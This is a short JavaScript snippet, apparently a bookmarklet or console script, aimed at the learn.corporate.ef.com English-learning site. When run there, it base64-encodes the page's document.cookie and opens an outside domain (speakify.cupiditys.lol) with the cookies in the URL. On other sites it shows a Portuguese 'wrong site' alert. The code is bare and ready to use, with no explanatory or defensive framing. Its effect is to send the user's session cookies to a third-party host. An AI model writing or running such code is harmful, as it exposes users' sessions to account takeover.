function sex(){
    if(location.hostname == "learn.corporate.ef.com"){
        let e = btoa(document.cookie)
        let url = "https://speakify.cupiditys.lol/index.html?speakData=" + e
        console.log(url)
        open(url)
    } else {
        alert("Site incorreto, por favor vá falar!")
    }
}

sex()